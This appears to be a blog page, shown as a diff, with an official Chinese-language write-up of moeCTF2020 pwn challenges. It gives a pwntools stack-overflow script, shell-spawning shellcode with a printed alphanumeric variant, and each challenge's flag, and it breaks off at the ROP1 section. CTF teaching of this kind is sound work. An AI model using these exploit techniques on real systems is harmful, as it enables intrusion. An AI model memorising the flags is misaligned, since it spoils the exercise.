@@ -1,0 +1,1606 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="信息安全,PWN,ret2shellcode,python,CTF,UAF,ROP,Alphanumeric Shellcode,ret2text,栈迁移,ret2libc,canary," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x00.绪论很荣幸能和RX大哥以及诸位带师傅共同出了moeCTF2020的题目，也希望做题的各位能够获得快乐XD 闲话不多说，点开即可查看题解👇  注：原题皆可在本页面直接下载">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CTF题解-0x03】moeCTF2020-partial official write up by arttnb3">
+<meta property="og:url" content="http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/index.html">
+<meta property="og:site_name" content="arttnba3&#39;s blog">
+<meta property="og:description" content="0x00.绪论很荣幸能和RX大哥以及诸位带师傅共同出了moeCTF2020的题目，也希望做题的各位能够获得快乐XD 闲话不多说，点开即可查看题解👇  注：原题皆可在本页面直接下载">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/xPJRSKz7MhOWn8I.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/01/frusiYZlnD39J4U.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/01/beydF6oiDAhQf4H.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/01/gDxUeytZdFS7Ph5.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/DqfQil7cmT6xIrS.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/X3YgIDKSVhWRJm5.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/01/JplCRSkxYLyEDKO.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/01/5fahTbeGgDlwNWt.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/15/kB9NEsTiAfwXSnz.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/cdTow3X5p6WUAHk.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/10/CTInhxDcJqsORVy.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/10/xptnlBUTFKISRsD.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/10/Bg5T7zeZVOWsJ9K.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/10/b5Ru7PmDZasA1jI.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/CmTilx3bQBschY8.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/rfdg523GS6IOy7k.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/1pKo5GdSW3Jf42u.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/oQREW8CdHIU59ai.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/ZGdgYATBi8L2fwm.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/8jlm6eZaWA1uMx5.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/IvTARLHcFo97XyS.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/BgKRwnzp5yTH7l8.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/XFxkV5w7uSKMmRG.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/MK2JW16oy3Db8FB.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/yPLIicR9daTVWB8.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/1fT5rBh23v6sayX.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/XOmzb8AWo92nvBi.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/tLToxVk8Cz19ARP.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/HDUg72BPC94AzJO.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/CYwqLfMRsyBxHK1.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/tHY6GJM3NWE8jUk.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/mLMFVgjHt5DzBas.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/BsmoxyjT8bOnvuh.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/vxIF8c1b4ATqtQW.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/hdC8S9FJGPBUbQl.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/fIoZyxE7F5biUQz.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/24/4HjdZqlBKp1fIrG.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/24/vf4jkEraNHWARhq.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/24/1Id5CqOT92ui4ZH.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/24/gY1Fxk7GERTjSBr.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/24/U8f5Y1CJrsdVT69.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/24/jQkcHxb5MgARspU.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/24/v79Elx15bWXdyoZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/hkzgUZj8rYPoFI3.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/GdmDsjEnXpBqobO.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/FidYB2N85WspeDt.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/zw9PxaDdpCf4h5B.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/QwGlAhc5fd9rItp.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/tpZQ1nE5oaGdsRX.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/oIvaelmuFLr24JY.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/s1t4V8f7k9JvLQT.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/k7gyPQfNmvLeJCn.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/7ILSlb95q12Dfny.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/thgBiFQcLl86mru.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/5qF6acIEWUGOvZ7.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/NDidotkIqXPuHn7.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/dPJUXZ6M9kx8RnN.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200809084003820.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/eWifdr1K3v8Vxka.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/6nQtRSwIdhX5peB.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/29/wtnmcLYru4OTdgs.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/29/lAEmSNwFPbVyfop.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/29/ZN8SXe5KECDAnJI.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/29/v7Kau1Bop9rckdU.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/vd5xKPI8GijfU1J.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/NbqLYV6teWK5ac4.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/GncNxdL3VBOEqme.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/QCOLqFobD9VR6Pz.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/vuzECAyDQGUibWx.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/o6kIlzaSBTD8Vs2.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/09/M6dEt8lkYCz3XFm.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/La7GHyJqUgs8Ypk.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/U9AtnyfguvRT8Mc.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/zvZ8fL4ajuQrgBR.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/s3OynaXBTk1hHEG.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/JtsWgfSHCvx2TkF.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/XfNGZtB9IwheKMW.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/vLb9BGnxU6gXYFj.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/A6EFvSJ4iQpjaMs.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/vVABX38Ki6uLrme.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/5N9jnd8zmtfwOuE.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/eiczTy3HB5pDmNZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/g7BfXK5VFrsjPJ8.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/LCmrMvXi4176Ka8.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/uso4xVS6PBq3eKF.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/WlUKzNnR56c29mA.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/naN1Du27iyLxdrU.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/l13R46VYfx9eb5a.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/KwufTlbtM7A3r4U.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/rp3luSN52OCIAos.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/bX3z5lheLdYI79a.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/RYecQ3KJW7rbkjZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/2sbVG16BrkJEOM8.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/Ud17cPvarkSs2my.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/8rR1fjKBd2xhqQL.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/DTwjCNSy5Fq6ga2.png">
+<meta property="og:image" content="c:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1602093565355.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/KR2VgHfd5cezaAF.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/S3j5dG2kierolQI.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/FG39pIlXquEgjDS.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/bj8o5W4wCuvze1Q.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/yfndjKzWN6hrUCZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/2cbvVt1i3ZRF5DW.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/08/oXghLYjH6aG1n49.png">
+<meta property="article:published_time" content="2020-09-06T20:44:37.000Z">
+<meta property="article:modified_time" content="2020-10-08T14:45:35.916Z">
+<meta property="article:author" content="arttnba3">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="ret2shellcode">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="Alphanumeric Shellcode">
+<meta property="article:tag" content="ret2text">
+<meta property="article:tag" content="栈迁移">
+<meta property="article:tag" content="ret2libc">
+<meta property="article:tag" content="canary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/10/08/xPJRSKz7MhOWn8I.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://archive.next.arttnba3.cn/2020/09/07/【CTF题解-0x03】moeCTF2020-write-up-by-arttnb3/"/>
+
+
+
+
+
+  <title>【CTF题解-0x03】moeCTF2020-partial official write up by arttnb3 | arttnba3's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/arttnba3" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">arttnba3's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">- arttnba3的隐秘小窝 -</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="arttnba3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="arttnba3's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【CTF题解-0x03】moeCTF2020-partial official write up by arttnb3</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-07T04:44:37+08:00">
+                2020-09-07
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2020-10-08T22:45:35+08:00">
+                2020-10-08
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  6,902 字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>很荣幸能和RX大哥以及诸位带师傅共同出了moeCTF2020的题目，也希望做题的各位能够获得快乐XD</p>
+<p>闲话不多说，点开即可查看题解👇</p>
+<blockquote>
+<p>注：原题皆可在本页面直接下载</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="0x01-Pwn"><a href="#0x01-Pwn" class="headerlink" title="0x01.Pwn"></a>0x01.Pwn</h1><h2 id="Pwn从入门到入狱"><a href="#Pwn从入门到入狱" class="headerlink" title="Pwn从入门到入狱"></a>Pwn从入门到入狱</h2><blockquote>
+<p>注：0基础新人还请仔细阅读这一份文件</p>
+</blockquote>
+<p>在文件末尾可以看到白给的flag</p>
+<p><img src="https://i.loli.net/2020/10/08/xPJRSKz7MhOWn8I.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>nc，提示<code>Please fill me up</code>，考虑到栈溢出，直接输出一长串随机字符串获得flag</p>
+<p><img src="https://i.loli.net/2020/08/01/frusiYZlnD39J4U.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;W3lc0m3_t0_tH3_w0r1d_0f_PWN!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Baby-Pwn-ret2text"><a href="#Baby-Pwn-ret2text" class="headerlink" title="Baby Pwn - ret2text"></a>Baby Pwn - ret2text</h2><p> <a href="/download/moectf2020/pwn/baby_pwn/pwn1"点击此处下载原题"">点击下载-pwn1</a> </p>
+<p>在IDA里我们很容易看得到存在字符串溢出漏洞</p>
+<p><img src="https://i.loli.net/2020/08/01/beydF6oiDAhQf4H.png" alt="image.png"></p>
+<p>同样的，我们可以看到在<code>.text</code>段存在可以被利用的<code>backdoor()</code>函数，易知该题可通过栈溢出覆写返回地址至<code>backdoor()</code>函数以getshell，是为一道很经典的ret2text</p>
+<p><img src="https://i.loli.net/2020/08/01/gDxUeytZdFS7Ph5.png" alt="image.png"></p>
+<p>相对于rbp的偏移量为0x40+8 = 72</p>
+<p><img src="https://i.loli.net/2020/08/06/DqfQil7cmT6xIrS.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/08/06/X3YgIDKSVhWRJm5.png" alt="image.png"></p>
+<p>故构造如下payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'pwn1'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10003)</span></span><br><span class="line">pl = <span class="string">'A'</span>*<span class="number">72</span> + p64(<span class="number">0x400676</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/01/JplCRSkxYLyEDKO.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;a0e65c41-fe8a-4db9-a070-f6593a5858c3&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Baby-Shellcode-shellcode"><a href="#Baby-Shellcode-shellcode" class="headerlink" title="Baby Shellcode - shellcode"></a>Baby Shellcode - shellcode</h2><p> <a href="/download/moectf2020/pwn/baby_shellcode/baby_shellcode"点击此处下载原题"">点击下载-baby_shellcode</a> </p>
+<p>拖进IDA可以看到这道题本地只有一个输出语句和一个输入语句</p>
+<p><img src="https://i.loli.net/2020/08/01/5fahTbeGgDlwNWt.png" alt="image.png"></p>
+<p>我们可以看到程序读入我们的输入后直接尝试将我们的输入作为代码来执行，因此我们直接构造getshell的shellcode输入即可</p>
+<p>使用<strong>asm(shellcraft.sh())</strong>可以直接获取一段shellcode</p>
+<p><img src="https://i.loli.net/2020/09/15/kB9NEsTiAfwXSnz.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;D0_yoU_kN0w_she11c0d3?&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="unusual-shellcode-Alphanumeric-Shellcode"><a href="#unusual-shellcode-Alphanumeric-Shellcode" class="headerlink" title="unusual shellcode - Alphanumeric Shellcode"></a>unusual shellcode - Alphanumeric Shellcode</h2><p> [点击下载-unusual](/download/moectf2020/pwn/unusual shellcode/unusual”点击此处下载原题”) </p>
+<p>首先是惯例的<code>checksec</code></p>
+<p><img src="https://i.loli.net/2020/10/08/cdTow3X5p6WUAHk.png" alt="image.png"></p>
+<p>除了地址随机化以外其他的都开满了</p>
+<p>拖入IDA进行分析</p>
+<p><img src="https://i.loli.net/2020/08/10/CTInhxDcJqsORVy.png" alt="image.png"></p>
+<p>v7是一个函数指针，并被分配到了<code>0x1000</code>大小的内存空间</p>
+<p>程序会从输入流逐字节读入最大4096个字节写入到v7所指向的空间上，且限制输入仅能为字母或数字否则终止输入</p>
+<p>输入结束后尝试执行函数指针v7</p>
+<p>那么我们直接输入一段shellcode即可getshell</p>
+<p>但是限制了输入只能是数字和字母，常见的shellcode都包含一些其他字符</p>
+<p>这个时候我们可以尝试百度XD</p>
+<p><img src="https://i.loli.net/2020/08/10/xptnlBUTFKISRsD.png" alt="image.png"></p>
+<p>得知一种叫做<strong>Alphanumeric Shellcode</strong>的东西www</p>
+<p>具体参见：<a href="https://www.freebuf.com/articles/system/232280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/232280.html</a></p>
+<p>首先从GitHub上随便找一个轮子</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure>
+
+<p>然后编写生成我们的shellcode的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> asm(sc)</span><br></pre></td></tr></table></figure>
+
+<p>输出重定向至文本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sc.py &gt; sc</span><br></pre></td></tr></table></figure>
+
+<p>使用轮子生成alphanumeric shellcode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">"sc"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/10/Bg5T7zeZVOWsJ9K.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure>
+
+
+
+<p>连接服务端，发送我们的alphanumeric shellcode，成功getshell</p>
+<p><img src="https://i.loli.net/2020/08/10/b5Ru7PmDZasA1jI.png" alt="image.png"></p>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_kn3w_tH3_a1ph4num3r1C_she1lc0de!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ROP1-ret2text"><a href="#ROP1-ret2text" class="headerlink" title="ROP1 - ret2text"></a>ROP1 - ret2text</h2><p> <a href="/download/moectf2020/pwn/rop1/rop1"点击此处下载原题"">点击下载-rop1</a> </p>
+<p>ROP即为<strong>Return-Oriented Programming ——返回导向编程</strong>， 是一种可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）的高级的内存攻击技术。</p>
+<blockquote>
